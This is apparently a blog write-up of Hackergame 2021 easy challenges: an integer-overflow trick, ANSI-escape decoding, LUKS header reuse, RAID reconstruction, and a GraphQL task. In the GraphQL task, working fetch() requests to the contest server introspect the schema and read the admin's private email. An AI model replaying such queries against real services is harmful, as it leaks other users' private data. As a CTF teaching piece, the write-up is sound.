---
layout: post
title: "Hackergame 2021 Writeup Part 2(Easy level)"
categories: Writeup Hackergame
---

This part of writeup contains tasks that require a bit programming & linux experience.

## 卖瓜

It's obvious that, you can't get exactly 20 with some 6 and 9. So there must be some magic that can help us achieve it.

As the task said, if the result becomes a float it will be invalid. But how can we turn it to a float?

I tried to put 3.3333 * 6 to the scale by changing the network packet but it didn't work. So it may be something related to integer overflow.

Let's try a $2^{63}$ level integer, $10^{18}$.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102213220.png)

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102213252.png)

Surprisingly, after adding it twice, we turned it to a float.

So looks like if the weight on the scale exceeds the maximum 64-bit signed integer, it will turn to a float.

But if we type a bigger number like $10^{19}$ which already exceeded the limit, it will add nothing to the scale.

What about to type exactly the limit $2^{63}-1$? In the 6 jin field, it won't work. But if in 9 jin field...

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102214817.png)

BOOOOOOM!

We make it overflow to negative.

And the absolute value of it can't divide by 3. So after carefully increasing it back to positive, we can get a value which has a remainder of 1 when is divided 3.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102215643.png)

Doing this again then we'll get a remainder of 2.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102215814.png)

Then just add a 6 and a 9, we'll get 20.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102215853.png)

## 透明的文件

Open the file, you'll see something like `[39m[19;61H[9;12H`. 

The format is quite similar to the thing we used to change linux terminal text color. Google it, and you'll know it's [ANSI escape code](https://en.wikipedia.org/wiki/ANSI_escape_code). 

So let's add `\033` before each `[`, which can be done with vim command `:s/\[/\\033\[/g`. And replace all invisible space character to other things like `#`.(can be done with `:s/\ /#/g` in vim)

Finally print it with echo -e, and you'll get the flag.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211102221411.png)

## 图之上的信息

According to the description of the task, we know that the website is using GraphQL to communicate with its backend.

After logging in, we can see from browser DevTools that a GraphQL request is sent out to retrieve notes.

What should we do? We can take a look at graphql.org. Then we find this page [Introspection](https://graphql.org/learn/introspection/).

Just do everything it said. First, we should ask the GraphQL endpoint what types are available.

```javascript
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "content-type": "application/json",
    "proxy-connection": "keep-alive"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({query:`{
  __schema {
    types {
      name
    }
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// Result:
{
    "data": {
        "__schema": {
            "types": [
                {
                    "name": "Query"
                },
                {
                    "name": "GNote"
                },
                {
                    "name": "Int"
                },
                {
                    "name": "String"
                },
                {
                    "name": "GUser"
                },
                ...
            ]
        }
    }
}
```
Note that there's a GUser named similarly to GNote. So maybe the GUser type is used for describing a user.

Let's check what fields appear in GUser.
```javascript
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "content-type": "application/json",
    "proxy-connection": "keep-alive"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({query:`{
  __type(name: "GUser") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// Result:
{
    "data": {
        "__type": {
            "name": "GUser",
            "fields": [
                {
                    "name": "id",
                    "type": {
                        "name": "Int",
                        "kind": "SCALAR"
                    }
                },
                {
                    "name": "username",
                    "type": {
                        "name": "String",
                        "kind": "SCALAR"
                    }
                },
                {
                    "name": "privateEmail",
                    "type": {
                        "name": "String",
                        "kind": "SCALAR"
                    }
                }
            ]
        }
    }
}
```
So we know the field which contains email is called `privateEmail`.

Next, we should find out what queries are available for us.
```javascript
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "content-type": "application/json",
    "proxy-connection": "keep-alive"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({query:`{
  __schema {
    queryType {
      fields {
        name
      }
    }
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// Result:
{
    "data": {
        "__schema": {
            "queryType": {
                "fields": [
                    {
                        "name": "note"
                    },
                    {
                        "name": "notes"
                    },
                    {
                        "name": "user"
                    }
                ]
            }
        }
    }
}
```
According to the request for notes, we can know our `userId` is 2. So the admin's is probably 1. Then finally we can write a similar request to get admin's email.
```javascript
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "content-type": "application/json",
    "proxy-connection": "keep-alive"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({query:`{
  user(id: 1){
      privateEmail
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// Result:
{
    "data": {
        "user": {
            "privateEmail": "flag{dont_let_graphql_l3ak_data_3940369369@hackergame.ustc}"
        }
    }
}
```

## 加密的U盘

To solve this task, we should find out how does LUKS work. On this [FAQ Page](https://gitlab.com/cryptsetup/cryptsetup/-/wikis/FrequentlyAskedQuestions)(I found this through Wikipedia), it describes LUKS as "multiple user keys with one master key". 

That means our data is encrypted with a master key which won't change unless you reformat the disk, then it uses our user key to encrypt that master key. If we need to change the user key, then it only needs to re-encrypt the master key, instead of re-encrypting the whole disk.

So, if we use the image of first day to get that master key, then use the master key to directly decrypt the second one, we can get the flag.

Easier implementation is just backing up the whole LUKS header of the first image then recover it to the second one. That can be done with these commands.

```shell
# Setup images as loop device
sudo losetup -P /dev/loop101 day1.img
sudo losetup -P /dev/loop102 day2.img

# Back up the header of the 1st image
sudo cryptsetup luksHeaderBackup /dev/loop101p1 --header-backup-file=luks-header

# Then restore to the 2nd image
sudo cryptsetup luksHeaderRestore /dev/loop102p1 --header-backup-file=luks-header

# Mount the 2nd image with the password of first image
sudo cryptsetup luksOpen /dev/loop102p2 day2
mkdir day2
sudo mount /dev/mapper/day2 day2

# Get the flag
cat day2/flag.txt
```

## 阵列恢复大师

### RAID-5

First, we should know [how RAID-5 work](https://en.wikipedia.org/wiki/Standard_RAID_levels#RAID_5).

Then we can get RAID-5 parameters(block size, layout) manually. View these images with a hex editor.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105082446.webp)

There's a `EFI PART` signature, so we can infer that this disk is using GPT. And this will only occur in the beginning of the logical disk, so we can know that in `3Rl` and `60k`, one is the first data disk, and another is the first parity disk.

|3D8|3Rl|60k|IrY|QjT|
|-------------------|
|   |1/P|1/P|   |   |

Then we scroll down to 00250000, that's where plain text begins, so maybe we can get the order here.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105083958.webp)

Three disks are plain text, but `3D8` is something we don't understand, and QjT is null bytes here.

Doing some calculation, we'll find out that `3D8@250000` is actually the xor parity block of other disks. Then let's scroll down and see when will the parity block end.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105091417.webp)

It ends at 00260000. So the block size is 10000h = 64KB.

Then how can we know the order? Let's observe the parity block moving pattern first.

Using the same method, we can get such information.

|start addr|3D8|3Rl|60k|IrY|QjT|
|------------------------------|
|000000| |1/P|1/P|   |   |
|......| | | | | |
|250000|P| | | | |
|260000| | | |P| |
|270000| |P| | | |
|280000| | |P| | |
|290000| | | | |P|
|2A0000|P| | | | |
|2B0000| | | |P| |
|2C0000| |P| | | |
|2D0000| | |P| | |
|2E0000| | | | |P|

And we can also work out the parity block at 000000.

|start addr|3D8|3Rl|60k|IrY|QjT|
|------------------------------|
|000000| |1|P|   |   |
|......| | | | | |
|250000|P| | | | |
|260000| | | |P| |
|270000| |P| | | |
|280000| | |P| | |
|290000| | | | |P|
|2A0000|P| | | | |
|2B0000| | | |P| |
|2C0000| |P| | | |
|2D0000| | |P| | |
|2E0000| | | | |P|

Referring to [RAID Layout](http://www.reclaime-pro.com/posters/raid-layouts.pdf), there are two possible ways to rebuild currently.

- 64KB, left symmetric, order: `3RI`,`IrY`,`3D8`,`QjT`,`60k`
- 64KB, left asymmetric, order: `3RI`,`IrY`,`3D8`,`QjT`,`60k`

Let's rearrange these disks for further checks.

|start addr|3Rl|IrY|3D8|QjT|60k|
|------------------------------|
|000000|1| | | |P|
|......| | | | | |
|250000| | |P| | |
|260000| |P| | | |
|270000|P| | | | |
|280000| | | | |P|
|290000| | | |P| |
|2A0000| | |P| | |
|2B0000| |P| | | |
|2C0000|P| | | | |
|2D0000| | | | |P|
|2E0000| | | |P| |

Remember the plain text content? We can use it to find out the actual way. It looks like GRUB makefile, so let's find it on the Internet.

[Here](https://git.parrotsec.org/packages/debian/grub2/-/raw/upstream/Makefile.in) it is.

Then we just need to find if the data block after QjT@280000 is 60k@290000 (left symmetric) or 3Rl@290000 (left asymmetric).

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105100347.webp)

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105100412.png)

So it should be left symmetric.

Then we can use DiskGenius to rebuild it.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105100911.webp)

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105101033.webp)

Then we can export and get flag.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105101358.webp)

### RAID-0

Similarly, open all the images with hex editor.

And the `EFI PART` signature appears in `wlO`, so it's the first disk.

Then we browse this disk, found out there are some data before 1DFFF0 but immediately stops at 1E0000. So we can infer that it's a block end.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105101955.webp)

Let's jump every disk to 1DFFF0.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105102255.webp)

Only `jCC` and `1GH` have data.

In RAID-0, data distributes like this:

|Disk 1|Disk 2|Disk 3|Disk 4|
|---------------------------|
|1|2|3|4|
|5|6|7|8|
|9|10|11|12|

So it means `jCC` and `1GH` should be Disk 2 & 3, though we don't know exactly which one should be in which place.

But it shouldn't end immediately, if the data size isn't exactly the multiples of block size.

So let's jump backwards in other disks.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105103232.webp)

Only the disk `5qi` has data in 1C0000~1DFFF0. So it should be the Disk 4. And we can infer from this that the block size is 20000h = 128KB.

Let's find more information.

Surprisingly, there's some plain text at `wlO@8C0000`. Similarly, let's jump every disk to that position.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105104010.webp)

Only `ID7` has something before 8C0000, so that should be the Disk 8 according to RAID-0 structure.

Now we know:

|Disk 1|Disk 2|Disk 3|Disk 4|Disk 5|Disk 6|Disk 7|Disk 8|
|-------------------------------------------------------|
|wlO|jCC/1GH|jCC/1GH|5qi| | | |ID7|

Then let's try if we can decide the order of other disks.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105104458.webp)
![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105104702.webp)

Here, `jCC` is more likely to be Disk 2, and `1GH` is more likely to be Disk 3.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105105009.webp)

And `d3B` should be Disk 5.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105105457.webp)
![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105105614.webp)

`eRL` should be Disk 6, and `RAp` should be Disk 7.

So that's all, the order is:

|Disk 1|Disk 2|Disk 3|Disk 4|Disk 5|Disk 6|Disk 7|Disk 8|
|-------------------------------------------------------|
|wlO|jCC|1GH|5qi|d3B|eRL|RAp|ID7|

Rebuild in DiskGenius

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105105951.webp)

But we can't see any files in it. Go to `Sector Editor`, the head of this partition is XFSB, so that means its filesystem is XFS. DiskGenius doesn't support this filesystem, then we need to mount it in Linux.

Clone the virtual RAID to a blank image.

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105111055.webp)

Then use the following commands in linux:

```shell
mkdir raid0
sudo losetup -P /dev/loop100 awa.img
sudo mount -t xfs /dev/loop100p1 raid0
cd raid0
python3 getflag.py
```

![](https://catmeowimg.oss-cn-chengdu.aliyuncs.com/img/20211105111842.png)

Finally, we got the flag.
